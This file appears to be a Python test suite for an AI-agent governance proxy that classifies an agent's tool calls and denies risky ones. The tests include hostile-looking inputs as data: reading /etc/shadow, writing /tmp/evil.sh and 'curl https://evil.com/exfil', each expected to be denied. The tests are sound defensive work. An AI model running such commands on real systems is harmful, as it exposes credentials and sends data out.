#!/usr/bin/env python3
"""
test_api_proxy.py — Tests for the Atested API governance proxy.

Tests cover:
- Non-streaming response governance (tool_use extraction, allow, deny)
- Streaming SSE response governance (tool_use buffering, allow, deny)
- Classification integration (classifier + policy evaluator)
- Chain recording (decisions written to chain)
- Response modification (denied tool_use replaced with text)
- Pass-through for non-messages endpoints
"""

import asyncio
import json
import os
import sys
import unittest
from pathlib import Path
from typing import Any, Optional
from unittest.mock import AsyncMock, MagicMock, patch

REPO = Path(__file__).resolve().parents[1]
PROXY_DIR = REPO / "proxy"
SCRIPTS = REPO / "scripts"
MCP_DIR = REPO / "mcp"
for p in (PROXY_DIR, SCRIPTS, MCP_DIR):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from proxy.server import (
    ChainRecorder,
    GovernanceProxy,
    StreamingToolCollector,
    extract_tool_use_blocks,
    mediate_decision,
    replace_tool_use_with_denial,
)
from classifier import classify
from policy_eval_v2 import load_policy_rules

_REPO_STR = str(REPO)
_POLICY = load_policy_rules()


def _make_policy(base_dirs=None):
    p = dict(_POLICY)
    p["base_dirs"] = base_dirs or [_REPO_STR]
    return p


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ===================================================================
# Tool use extraction
# ===================================================================

class TestExtractToolUseBlocks(unittest.TestCase):
    """Extract tool_use blocks from Messages API response content."""

    def test_empty_content(self):
        self.assertEqual(extract_tool_use_blocks([]), [])

    def test_text_only(self):
        content = [{"type": "text", "text": "Hello"}]
        self.assertEqual(extract_tool_use_blocks(content), [])

    def test_single_tool_use(self):
        content = [
            {"type": "text", "text": "Let me read that file."},
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/tmp/test.txt"}},
        ]
        blocks = extract_tool_use_blocks(content)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0]["name"], "Read")

    def test_multiple_tool_use(self):
        content = [
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/tmp/a.txt"}},
            {"type": "tool_use", "id": "t2", "name": "Write",
             "input": {"file_path": "/tmp/b.txt", "content": "hello"}},
        ]
        blocks = extract_tool_use_blocks(content)
        self.assertEqual(len(blocks), 2)


# ===================================================================
# Denial replacement
# ===================================================================

class TestReplaceDenial(unittest.TestCase):
    """Replace tool_use blocks with denial text."""

    def test_replace_single_tool(self):
        content = [
            {"type": "text", "text": "I'll read that."},
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/etc/shadow"}},
        ]
        result = replace_tool_use_with_denial(
            content, "t1", "Read", "sensitive path", "deny-sensitive"
        )
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0]["type"], "text")
        self.assertEqual(result[1]["type"], "text")
        self.assertIn("Governance", result[1]["text"])
        self.assertIn("Read", result[1]["text"])
        self.assertIn("sensitive path", result[1]["text"])

    def test_replace_preserves_other_blocks(self):
        content = [
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": os.path.join(_REPO_STR, "README.md")}},
            {"type": "tool_use", "id": "t2", "name": "Read",
             "input": {"file_path": "/etc/shadow"}},
        ]
        result = replace_tool_use_with_denial(
            content, "t2", "Read", "denied", "rule"
        )
        self.assertEqual(result[0]["type"], "tool_use")
        self.assertEqual(result[1]["type"], "text")


# ===================================================================
# Mediation decision (classify → evaluate → record)
# ===================================================================

class TestMediateDecision(unittest.TestCase):
    """Decision-only mediation without execution."""

    def test_allow_read_within_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertEqual(record["record_version"], "2.0")
        self.assertEqual(record["record_type"], "mediated_decision")

    def test_deny_sensitive_path(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": "/etc/shadow"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")

    def test_deny_write_outside_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write", {"file_path": "/tmp/evil.sh", "content": "#!/bin/bash"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")

    def test_allow_write_within_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write", {"file_path": os.path.join(_REPO_STR, "test.txt"),
                      "content": "hello"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")

    def test_classification_metadata_present(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy,
        )
        cls = record["classification"]
        self.assertEqual(cls["action_type"], "read")
        self.assertIn(cls["confidence_tier"], [1, 2])
        self.assertIn("targets", cls)

    def test_chain_recording(self):
        policy = _make_policy()
        recorder = ChainRecorder(Path("/tmp/claude/test_proxy_chain.jsonl"))
        # Clean up
        recorder._chain_path.unlink(missing_ok=True)

        mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, chain_recorder=recorder,
        )
        mediate_decision(
            "Read", {"file_path": "/etc/shadow"},
            policy=policy, chain_recorder=recorder,
        )

        lines = recorder._chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        r1 = json.loads(lines[0])
        r2 = json.loads(lines[1])
        self.assertEqual(r1["policy_decision"], "ALLOW")
        self.assertEqual(r2["policy_decision"], "DENY")
        # Chain linkage
        self.assertEqual(r2["prev_record_hash"], r1["record_hash"])

        recorder._chain_path.unlink(missing_ok=True)

    def test_user_identity_recorded(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, user_identity="test-user",
        )
        self.assertEqual(record["user_identity"], "test-user")

    def test_session_id_recorded(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, session_id="sess-123",
        )
        self.assertEqual(record["session_id"], "sess-123")


# ===================================================================
# Claude Code native tool classification
# ===================================================================

class TestNativeToolClassification(unittest.TestCase):
    """Classify Claude Code's native tools correctly."""

    def test_read_tool(self):
        cls = classify("Read", {"file_path": "/tmp/test.txt"})
        self.assertEqual(cls["action_type"], "read")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_write_tool(self):
        cls = classify("Write", {"file_path": "/tmp/test.txt", "content": "x"})
        self.assertEqual(cls["action_type"], "write")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_edit_tool(self):
        cls = classify("Edit", {"file_path": "/tmp/test.txt",
                                "old_string": "a", "new_string": "b"})
        self.assertEqual(cls["action_type"], "write")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_bash_tool(self):
        cls = classify("Bash", {"command": "ls -la"})
        # Bash commands are at least tier 2 (inferred) or tier 3 (opaque)
        self.assertIn(cls["confidence_tier"], [2, 3])
        self.assertEqual(cls["action_type"], "execute")

    def test_bash_tool_sensitive(self):
        cls = classify("Bash", {"command": "cat /etc/shadow"})
        # The classifier sees this as an execute with /etc/shadow as a target
        # Classifier includes full command as target; verify the sensitive path is referenced
        self.assertTrue(
            any("/etc/shadow" in t for t in cls["targets"]),
            f"Expected /etc/shadow referenced in targets, got {cls['targets']}",
        )

    def test_glob_tool(self):
        cls = classify("Glob", {"pattern": "*.py", "path": "/tmp"})
        self.assertEqual(cls["action_type"], "list")

    def test_grep_tool(self):
        cls = classify("Grep", {"pattern": "TODO", "path": "/tmp"})
        # Grep may classify as read or list depending on evidence
        self.assertIn(cls["action_type"], ["read", "list"])


# ===================================================================
# Streaming tool collector
# ===================================================================

class TestStreamingToolCollector(unittest.TestCase):
    """Streaming SSE tool_use block collection and governance."""

    def _make_collector(self, base_dirs=None):
        policy = _make_policy(base_dirs or [_REPO_STR])
        return StreamingToolCollector(policy, None)

    def test_text_block_passes_through(self):
        collector = self._make_collector()
        action = collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "text", "text": ""},
        })
        self.assertEqual(action, "pass")

    def test_tool_use_start_buffers(self):
        collector = self._make_collector()
        action = collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {
                "type": "tool_use",
                "id": "t1",
                "name": "Read",
                "input": {},
            },
        })
        self.assertEqual(action, "buffer")

    def test_tool_use_delta_buffers(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta
        action = collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": '{"file_path": "',
            },
        })
        self.assertEqual(action, "buffer")

    def test_allowed_tool_passes_on_stop(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta with path inside repo
        path = os.path.join(_REPO_STR, "README.md")
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": json.dumps({"file_path": path}),
            },
        })
        # Stop
        action = collector.process_event("content_block_stop", {
            "type": "content_block_stop",
            "index": 0,
        })
        self.assertEqual(action, "pass")
        self.assertFalse(collector.is_denied(0))

    def test_denied_tool_replaces_on_stop(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta with sensitive path
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": '{"file_path": "/etc/shadow"}',
            },
        })
        # Stop
        action = collector.process_event("content_block_stop", {
            "type": "content_block_stop",
            "index": 0,
        })
        self.assertEqual(action, "replace")
        self.assertTrue(collector.is_denied(0))

    def test_denied_tool_has_replacement_events(self):
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": '{"file_path": "/etc/shadow"}'},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        events = collector.get_replacement_events(0)
        self.assertTrue(len(events) >= 3)  # start, delta, stop

        # Parse the events
        all_text = b"".join(events).decode()
        self.assertIn("content_block_start", all_text)
        self.assertIn("content_block_delta", all_text)
        self.assertIn("content_block_stop", all_text)
        self.assertIn("Governance", all_text)
        self.assertIn("denied", all_text.lower())

    def test_decision_record_available(self):
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {"type": "input_json_delta",
                      "partial_json": json.dumps({"file_path": os.path.join(_REPO_STR, "README.md")})},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        decision = collector.get_decision(0)
        self.assertIsNotNone(decision)
        self.assertEqual(decision["policy_decision"], "ALLOW")
        self.assertEqual(decision["record_version"], "2.0")

    def test_multi_fragment_json_reassembly(self):
        """Tool input JSON arrives in multiple delta events."""
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Split the JSON across multiple deltas
        path = os.path.join(_REPO_STR, "README.md")
        full_json = json.dumps({"file_path": path})
        mid = len(full_json) // 2

        collector.process_event("content_block_delta", {
            "type": "content_block_delta", "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": full_json[:mid]},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta", "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": full_json[mid:]},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        decision = collector.get_decision(0)
        self.assertEqual(decision["policy_decision"], "ALLOW")


# ===================================================================
# Non-streaming proxy handler
# ===================================================================

class TestNonStreamingProxy(unittest.TestCase):
    """GovernanceProxy handling of non-streaming Messages API responses."""

    def _make_proxy(self, base_dirs=None):
        policy = _make_policy(base_dirs or [_REPO_STR])
        return GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=policy,
        )

    def test_allow_preserves_response(self):
        proxy = self._make_proxy()
        path = os.path.join(_REPO_STR, "README.md")

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": path}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertEqual(data["content"][0]["type"], "tool_use")
        self.assertEqual(data["stop_reason"], "tool_use")

    def test_deny_replaces_tool_use(self):
        proxy = self._make_proxy()

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "text", "text": "Let me read that file."},
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        # tool_use should be replaced with text
        tool_blocks = [b for b in data["content"] if b["type"] == "tool_use"]
        text_blocks = [b for b in data["content"] if b["type"] == "text"]
        self.assertEqual(len(tool_blocks), 0)
        self.assertEqual(len(text_blocks), 2)  # original + denial
        self.assertIn("Governance", text_blocks[1]["text"])
        # stop_reason should change since no tool_use blocks remain
        self.assertEqual(data["stop_reason"], "end_turn")

    def test_mixed_allow_deny(self):
        """One tool allowed, one denied in the same response."""
        proxy = self._make_proxy()
        path = os.path.join(_REPO_STR, "README.md")

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": path}},
                {"type": "tool_use", "id": "t2", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        tool_blocks = [b for b in data["content"] if b["type"] == "tool_use"]
        text_blocks = [b for b in data["content"] if b["type"] == "text"]
        self.assertEqual(len(tool_blocks), 1)  # allowed one remains
        self.assertEqual(tool_blocks[0]["id"], "t1")
        self.assertEqual(len(text_blocks), 1)  # denial text
        # stop_reason stays tool_use since one tool remains
        self.assertEqual(data["stop_reason"], "tool_use")

    def test_non_messages_endpoint_passthrough(self):
        """Non-messages endpoints are forwarded without governance."""
        proxy = self._make_proxy()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = b'{"models": []}'
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, _, body = _run(proxy.handle_request(
                "GET", "/v1/models", {}, b"",
            ))

        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body), {"models": []})

    def test_text_only_response_passthrough(self):
        """Response with no tool_use blocks passes through unchanged."""
        proxy = self._make_proxy()

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [{"type": "text", "text": "Hello!"}],
            "stop_reason": "end_turn",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, _, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        self.assertEqual(data["content"][0]["text"], "Hello!")

    def test_chain_recording_through_proxy(self):
        """Proxy records decisions in the governance chain."""
        chain_path = Path("/tmp/claude/test_proxy_chain_handler.jsonl")
        chain_path.unlink(missing_ok=True)
        recorder = ChainRecorder(chain_path)

        proxy = GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=_make_policy(),
            chain_recorder=recorder,
        )

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": os.path.join(_REPO_STR, "README.md")}},
                {"type": "tool_use", "id": "t2", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        lines = chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        r1 = json.loads(lines[0])
        r2 = json.loads(lines[1])
        self.assertEqual(r1["policy_decision"], "ALLOW")
        self.assertEqual(r2["policy_decision"], "DENY")
        self.assertEqual(r2["prev_record_hash"], r1["record_hash"])

        chain_path.unlink(missing_ok=True)


# ===================================================================
# Privacy — no content storage
# ===================================================================

class TestPrivacy(unittest.TestCase):
    """Verify governance records don't contain conversation content."""

    def test_no_file_content_in_record(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write",
            {"file_path": os.path.join(_REPO_STR, "test.txt"),
             "content": "SECRET_API_KEY=sk-12345"},
            policy=policy,
        )
        record_json = json.dumps(record)
        self.assertNotIn("SECRET_API_KEY", record_json)
        self.assertNotIn("sk-12345", record_json)

    def test_no_execution_output_in_record(self):
        """Records contain the command (for classification) but not its output."""
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "echo hello"},
            policy=policy,
        )
        # The command is in targets/evidence (needed for classification).
        # But execution output (what the command prints) is NOT in the record
        # because the proxy never executes — it only classifies the request.
        self.assertNotIn("execution_result", record)
        self.assertNotIn("stdout", json.dumps(record))


# ===================================================================
# Bash tool governance (Tier 2 operations)
# ===================================================================

class TestBashToolGovernance(unittest.TestCase):
    """Bash/execute tools are classified and governed."""

    def test_bash_git_push_denied(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "git push origin main"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")
        cls = record["classification"]
        self.assertEqual(cls["scope"], "remote")

    def test_bash_ls_allowed(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "ls -la " + _REPO_STR},
            policy=policy,
        )
        # ls is tier 2, should be allowed for local operations
        self.assertIn(record["policy_decision"], ["ALLOW", "DENY"])

    def test_bash_curl_denied(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "curl https://evil.com/exfil"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")


# ===================================================================
# Query parameter handling (D-027 regression)
# ===================================================================

class TestQueryParameterHandling(unittest.TestCase):
    """Endpoints with query parameters must still be detected correctly."""

    def _make_proxy(self):
        policy = _make_policy([_REPO_STR])
        return GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=policy,
        )

    def test_prepare_request_with_beta_query(self):
        """_prepare_request detects messages endpoint despite ?beta= query param."""
        proxy = self._make_proxy()
        body = json.dumps({"messages": [], "stream": True}).encode()
        url, _, is_messages, is_streaming = proxy._prepare_request(
            "POST", "/v1/messages?beta=prompt_caching_2024_09_30",
            {"content-type": "application/json"}, body,
        )
        self.assertTrue(is_messages, "Should detect /v1/messages with query params")
        self.assertTrue(is_streaming, "Should detect stream=true with query params")
        self.assertIn("?beta=", url, "Query params must be preserved in upstream URL")

    def test_prepare_request_without_query(self):
        """_prepare_request still works without query parameters."""
        proxy = self._make_proxy()
        body = json.dumps({"messages": [], "stream": True}).encode()
        _, _, is_messages, is_streaming = proxy._prepare_request(
            "POST", "/v1/messages", {"content-type": "application/json"}, body,
        )
        self.assertTrue(is_messages)
        self.assertTrue(is_streaming)

    def test_prepare_request_non_messages_with_query(self):
        """Non-messages endpoints with query params are not misidentified."""
        proxy = self._make_proxy()
        _, _, is_messages, _ = proxy._prepare_request(
            "GET", "/v1/models?limit=10", {}, b"",
        )
        self.assertFalse(is_messages)


if __name__ == "__main__":
    unittest.main()
